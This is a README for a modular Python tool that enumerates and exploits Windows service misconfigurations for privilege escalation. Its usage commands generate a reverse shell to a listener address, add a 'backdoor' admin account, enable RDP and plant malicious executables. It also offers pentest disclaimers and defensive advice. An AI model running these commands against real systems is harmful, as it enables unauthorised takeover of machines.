# Service Exploitation Framework

A modular Python framework for discovering and exploiting Windows service misconfigurations for privilege escalation.

## ⚠️ Legal Disclaimer

This tool is intended for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Overview

The Service Exploitation Framework provides automated discovery and exploitation of common Windows service misconfigurations:

- **Unquoted Service Paths**: Services with unquoted paths containing spaces
- **Weak Binary Permissions**: Service executables writable by low-privileged users
- **Weak Service Permissions**: Services with modifiable configurations

## Directory Structure

```
service_exploitation_framework/
├── __init__.py              # Package initialization
├── service_exploit.py       # Main CLI entry point
├── README.md                # This file
│
├── core/                    # Core functionality
│   ├── __init__.py
│   ├── base.py              # Abstract base class for exploits
│   └── enumerator.py        # Service enumeration module
│
├── exploits/                # Exploitation modules
│   ├── __init__.py
│   ├── unquoted_path.py     # Unquoted path exploitation
│   └── weak_permissions.py  # Weak permissions exploitation
│
├── payloads/                # Payload generation
│   ├── __init__.py
│   └── generator.py         # Malicious payload generator
│
├── utils/                   # Utility functions
│   ├── __init__.py
│   └── helpers.py           # Helper utilities
│
└── output/                  # Generated payloads and logs
```

## Installation

```bash
# Clone or copy the framework
git clone <repo> service_exploitation_framework
cd service_exploitation_framework

# No additional dependencies required (uses standard library)
# Optional: Install msfvenom for compiled payloads
```

## Quick Start

### Enumerate All Vulnerabilities

```bash
python service_exploit.py --enumerate
```

### Find Specific Vulnerability Types

```bash
# Unquoted service paths only
python service_exploit.py --enumerate-unquoted

# Weak permissions only
python service_exploit.py --enumerate-weak
```

### Generate Payloads

```bash
# Reverse shell
python service_exploit.py --generate reverse_shell --lhost 192.168.1.100 --lport 4444

# Add admin user
python service_exploit.py --generate add_user --username backdoor --password Secret123!

# Enable RDP
python service_exploit.py --generate enable_rdp --username rdpuser --password RDPPass123!
```

### Exploit Vulnerable Services

```bash
# Exploit unquoted path
python service_exploit.py --exploit-unquoted "VulnService" --payload ./malicious.exe

# Exploit weak permissions
python service_exploit.py --exploit-weak "WeakService" --payload ./malicious.exe
```

## Module Usage

### As a Library

```python
from service_exploitation_framework import (
    ServiceEnumerator,
    UnquotedPathExploit,
    WeakPermissionsExploit,
    PayloadGenerator
)

# Enumerate services
enumerator = ServiceEnumerator()
services = enumerator.get_all_services()

# Find unquoted path vulnerabilities
unquoted = UnquotedPathExploit()
vulnerable = unquoted.enumerate()

# Find exploitable locations
for svc in vulnerable:
    locations = unquoted.find_exploitable_locations(svc['path'])
    print(f"{svc['name']}: {len(locations)} exploitable locations")

# Generate payload
generator = PayloadGenerator()
generator.generate_add_user("hacker", "Password123!")
```

## Attack Techniques

### Unquoted Service Path

When a service binary path contains spaces and isn't quoted:

```
C:\Program Files\Some App\service.exe
```

Windows searches in this order:
1. `C:\Program.exe`
2. `C:\Program Files\Some.exe`
3. `C:\Program Files\Some App\service.exe`

If you can write to `C:\` or `C:\Program Files\`, you can hijack execution.

### Weak Binary Permissions

If BUILTIN\Users or Everyone has Modify (M) or Full Control (F) on a service binary, you can replace it with a malicious executable.

### Weak Service Permissions

If you can modify a service's configuration (SC_MANAGER_ALL_ACCESS), you can change its binary path to point to your payload.

## Output Files

All output is saved to the `service_exploits/` directory:

- `exploit_log_YYYYMMDD_HHMMSS.txt` - Operation logs
- `service_enum_YYYYMMDD_HHMMSS.txt` - Enumeration results
- `*.exe` - Generated payloads (if msfvenom available)
- `*.c` - Payload source code templates

## Compiling Payloads

If msfvenom is not available, compile the generated C source:

```bash
# On Linux (cross-compile for Windows)
x86_64-w64-mingw32-gcc -o payload.exe payload.c -lws2_32

# On Windows (with MinGW)
gcc -o payload.exe payload.c -lws2_32
```

## Defense Recommendations

1. **Quote all service paths** containing spaces
2. **Restrict permissions** on service binaries and directories
3. **Use least-privilege** service accounts
4. **Monitor** for service binary modifications
5. **Audit** service configurations regularly

## References

- [MITRE ATT&CK - Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)

## License

For educational and authorized testing purposes only.